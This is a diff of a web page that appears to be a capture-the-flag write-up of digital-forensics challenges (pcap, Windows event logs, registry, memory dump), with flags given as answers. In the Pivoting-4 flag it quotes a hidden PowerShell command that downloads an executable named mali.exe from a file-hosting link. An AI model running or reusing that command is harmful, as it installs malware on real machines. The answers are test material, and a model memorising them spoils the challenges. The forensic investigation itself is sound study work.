@@ -138,14 +138,17 @@
                 <img src="images/ICMTC/D/d1.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> I opened the challenge
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> the challenge was pcap
+                        file so I opened it
                         with networkminer </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img
-                            src="images/ICMTC/SD/1.jpg" class="img-fluid" alt=""></li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> and i found 2 files
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> in files section i saw 2
+                        malicious files <img src="images/ICMTC/SD/1.jpg" class="img-fluid" alt=""></li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i opened them and i
+                        found the 2 files contain base64 content
                         <img src="images/ICMTC/SD/1-1.jpg" class="img-fluid" alt="">
                     </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i Used CyberChef 
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>then i Used CyberChef , and
+                        got the flags
                         <img src="images/ICMTC/SD/1-2.jpg" class="img-fluid" alt="">
                     </li>
                 </ul>
@@ -165,7 +168,7 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-1 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
@@ -176,16 +179,39 @@
                 <img src="images/ICMTC/D/d2.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> the description of the challenge :The IT staff has noticed an abnormal activities, they contacted the Incident Response team to take logs and investigate. </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i start to use "A Golang EVTX Parser" tool  </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> the description of the
+                        challenge :The IT staff has noticed an abnormal activities, they contacted the Incident Response
+                        team to take logs and investigate. </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i start to use "A
+                        Golang EVTX Parser" tool </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
-                        i start to Parser Security.evtx file
-                        <img src="images/ICMTC/SD/2-1.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img src="images/ICMTC/SD/2-2.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img src="images/ICMTC/SD/2-3.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img src="images/ICMTC/SD/2-4.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img src="images/ICMTC/SD/2.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> then i decided to try "Kerberos" and "ssh" </li>
+                        i start to Parser Security.evtx file to try to find any abnormal activities
+                        <img src="images/ICMTC/SD/2-1.jpg" class="img-fluid" alt="">
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
+                        "LogonProcessName" is a field that appears in Security.evtx, which is the Windows Security event
+                        log. It refers to the name of the process responsible for handling a user's logon attempt.
+                        <br>
+                        When a user attempts to log on to a Windows computer, an authentication process takes place.
+                        During this process, the user's credentials are verified by the operating system, and if the
+                        credentials are valid, the user is granted access to the system. The "LogonProcessName" field in
+                        Security.evtx records the name of the process that handles this authentication process.
+                        <br>
+                        The LogonProcessName field can be useful in troubleshooting issues related to user logons, such
+                        as failed logon attempts or unauthorized access attempts. By examining this field in
+                        Security.evtx, security administrators can identify which process was responsible for handling a
+                        particular logon attempt and use this information to investigate any anomalous or suspicious
+                        activity.
+                        <img src="images/ICMTC/SD/2-2.jpg" class="img-fluid" alt="">
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img
+                            src="images/ICMTC/SD/2-3.jpg" class="img-fluid" alt=""> </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> <img
+                            src="images/ICMTC/SD/2-4.jpg" class="img-fluid" alt=""> </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i used "sort -u" to show
+                        uniqe result and don't repeate <img src="images/ICMTC/SD/2.jpg" class="img-fluid" alt=""> </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> then i decided to try
+                        "ssh" in the flag format and i got the right flag EGCERT{ssh} </li>
                 </ul>
             </div>
         </div>
@@ -201,7 +227,7 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-2 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
@@ -212,9 +238,10 @@
                 <img src="images/ICMTC/D/d3.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> it was easy 
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> it was easy , just see the
+                        content of the challenge
                         <img src="images/ICMTC/SD/3.jpg" class="img-fluid" alt="">
-                     </li>
+                    </li>
                 </ul>
             </div>
         </div>
@@ -231,7 +258,7 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-3 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
@@ -242,17 +269,19 @@
                 <img src="images/ICMTC/D/d4.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i start to use "A Golang EVTX Parser" tool  </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i start to use "A
+                        Golang EVTX Parser" tool </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
-                        the description of the challenge :What is the name of the malicious executable that was downloaded on DC01?
+                        the description of the challenge :What is the name of the malicious executable that was
+                        downloaded on DC01?
                         <br>
-                        so i decided to search in powerShell  
+                        so i decided to search in powerShell
                         <img src="images/ICMTC/SD/4.jpg" class="img-fluid" alt="">
-                     </li>
+                    </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
-                        and just search about http
+                        and just search about http , and i got the flag
                         <img src="images/ICMTC/SD/4-1.jpg" class="img-fluid" alt="">
-                     </li>
+                    </li>
                 </ul>
             </div>
         </div>
@@ -268,18 +297,21 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-4 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
-                                    class="bi bi-activity"></i> EGCERT{powershell.exe -w hidden -noni -nop -exec EX https://www.mediafire.com/file/3bytgnxqzimrns0/mali.exe C:\Users\Administrator\Desktop\mali.exe}</li>
+                                    class="bi bi-activity"></i> EGCERT{powershell.exe -w hidden -noni -nop -exec EX
+                                https://www.mediafire.com/file/3bytgnxqzimrns0/mali.exe
+                                C:\Users\Administrator\Desktop\mali.exe}</li>
                         </ul>
                     </div>
                 </div>
                 <img src="images/ICMTC/D/d5.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> just here  
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> when we solve "Pivoting-2"
+                        challenge, we saw the full command , just here
                         <img src="images/ICMTC/SD/5.jpg" class="img-fluid" alt="">
                     </li>
                 </ul>
@@ -299,7 +331,7 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-5 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
@@ -310,23 +342,28 @@
                 <img src="images/ICMTC/D/d6.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         the description of the challenge : What was the technique used to access Workstation_2?</li>
 
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
-                        so  i start to Parser Security.evtx file
-                        <img src="images/ICMTC/SD/6.jpg" class="img-fluid" alt=""> </li>
+                        so i start to Parser Security.evtx file
+                        <img src="images/ICMTC/SD/6.jpg" class="img-fluid" alt="">
+                    </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         i searched for "event id for failed login"
-                        <img src="images/ICMTC/SD/6-1.jpg" class="img-fluid" alt=""> </li>
+                        <img src="images/ICMTC/SD/6-1.jpg" class="img-fluid" alt="">
+                    </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         i realised that there is a large number of failed login
-                        <img src="images/ICMTC/SD/6-2.jpg" class="img-fluid" alt=""> </li>
+                        <img src="images/ICMTC/SD/6-2.jpg" class="img-fluid" alt="">
+                    </li>
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         and in small time too !
-                        <img src="images/ICMTC/SD/6-3.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i><img src="images/ICMTC/SD/6-4.jpg" class="img-fluid" alt=""> </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
+                        <img src="images/ICMTC/SD/6-3.jpg" class="img-fluid" alt="">
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i><img
+                            src="images/ICMTC/SD/6-4.jpg" class="img-fluid" alt=""> </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         so simply it is bruteforce</li>
                 </ul>
             </div>
@@ -355,33 +392,36 @@
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
-                    the description of challenge was unclear, so i can not solve it in the competition , after competition i see this description in challenge file 
-                    <img src="images/ICMTC/SD/9.jpg" class="img-fluid" alt="">
+                        the description of challenge was unclear, so i can not solve it in the competition , after
+                        competition i see this description in challenge file
+                        <img src="images/ICMTC/SD/9.jpg" class="img-fluid" alt="">
                     </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
-                    and from "Pivoting-7" challenge i know the flag is "EGCERT{Workstation_2, Workstation_1, DC01}" so all i want is getting the ip of Workstation_2
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
+                        and from "Pivoting-7" challenge i know the flag is "EGCERT{Workstation_2, Workstation_1, DC01}"
+                        so all i want is getting the ip of Workstation_2
                     </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         i tried to open SYSTEM registry file using the Registry Explorer tool but i get this error
                         <img src="images/ICMTC/SD/9-1.jpg" class="img-fluid" alt="">
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
-                        so i searched about this erorr 
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
+                        so i searched about this erorr
                         <img src="images/ICMTC/SD/9-2.jpg" class="img-fluid" alt="">
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
-                        i found this amazing artical here "https://cybermeisam.medium.com/blue-team-system-live-analysis-part-11-windows-user-account-forensics-ntuser-dat-495ab41393db"
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
+                        i found this amazing artical here
+                        "https://cybermeisam.medium.com/blue-team-system-live-analysis-part-11-windows-user-account-forensics-ntuser-dat-495ab41393db"
                         and his suggestion to use these tools
-                        <img src="images/ICMTC/SD/9-3.jpg" class="img-fluid" alt=""> 
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
-                        so i install "RegRipper3.0" and used it 
-                        <img src="images/ICMTC/SD/9-4.jpg" class="img-fluid" alt=""> 
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
+                        <img src="images/ICMTC/SD/9-3.jpg" class="img-fluid" alt="">
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
+                        so i install "RegRipper3.0" and used it
+                        <img src="images/ICMTC/SD/9-4.jpg" class="img-fluid" alt="">
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         and i get the ip
-                        <img src="images/ICMTC/SD/9-5.jpg" class="img-fluid" alt=""> 
-                     </li>
+                        <img src="images/ICMTC/SD/9-5.jpg" class="img-fluid" alt="">
+                    </li>
                 </ul>
             </div>
         </div>
@@ -399,7 +439,7 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Name : <i
                                     class="bi bi-activity"></i> Pivoting-7 </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Category: <i
-                                    class="bi bi-activity"></i> Reverse </li>
+                                    class="bi bi-activity"></i> Digital Forensics </li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
@@ -410,16 +450,17 @@
                 <img src="images/ICMTC/D/d8.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> the description of the challenge : Using the names (DC01, Workstaion_1, Workstation_2) 
-                     </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> 
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> the description of the
+                        challenge : Using the names (DC01, Workstaion_1, Workstation_2)
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i>
                         <img src="images/ICMTC/SD/7.jpg" class="img-fluid" alt="">
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i test :
-                        EGCERT{Workstation_2, DC01, Workstation_1} 
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i test :
+                        EGCERT{Workstation_2, DC01, Workstation_1}
                         <br>
                         EGCERT{Workstation_2, Workstation_1, DC01}
-                     </li>
+                    </li>
                 </ul>
             </div>
         </div>
@@ -445,26 +486,33 @@
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Level: <i
                                     class="bi bi-activity"></i> Medium</li>
                             <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> Flag : <i
-                                    class="bi bi-activity"></i> EGCERT{C:\Users\CAIOS\Desktop\VCRUNTIME140_1.dll:974f1000}</li>
+                                    class="bi bi-activity"></i>
+                                EGCERT{C:\Users\CAIOS\Desktop\VCRUNTIME140_1.dll:974f1000}</li>
                         </ul>
                     </div>
                 </div>
                 <img src="images/ICMTC/D/d11.jpg" class="img-fluid" alt="">
                 <h5 class="card-title mgf">SOLUTION</h5>
                 <ul class="list-group" style="text-align: left;">
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i started by search about .dmp Forensics and i found this website "https://helpdeskgeek.com/windows-10/how-to-analyze-memory-dump-files-dmp-in-windows-10/"
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i started by search about
+                        .dmp Forensics and i found this website
+                        "https://helpdeskgeek.com/windows-10/how-to-analyze-memory-dump-files-dmp-in-windows-10/"
                         <img src="images/ICMTC/SD/8-1.jpg" class="img-fluid" alt="">
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i install the tool and searched about cheat-sheet for it and i  found this website "https://theartofdev.com/windbg-cheat-sheet/"
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> so i install the tool and
+                        searched about cheat-sheet for it and i found this website
+                        "https://theartofdev.com/windbg-cheat-sheet/"
                         <img src="images/ICMTC/SD/8-2.jpg" class="img-fluid" alt="">
-                     </li>
-                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i tried many commands untill i found this
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i tried many commands
+                        untill i found this
                         <img src="images/ICMTC/SD/8.jpg" class="img-fluid" alt="">
-                     </li>
-                     <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i tried many with "C:\Users\CAIOS\Desktop\twodrive.exe" but it was not correct 
+                    </li>
+                    <li class="list-group-item"><i class="bi bi-arrow-right-square-fill"></i> i tried many with
+                        "C:\Users\CAIOS\Desktop\twodrive.exe" but it was not correct
                         <br>
                         but "C:\Users\CAIOS\Desktop\VCRUNTIME140_1.dll" was right
-                     </li>
+                    </li>
                 </ul>
             </div>
         </div>
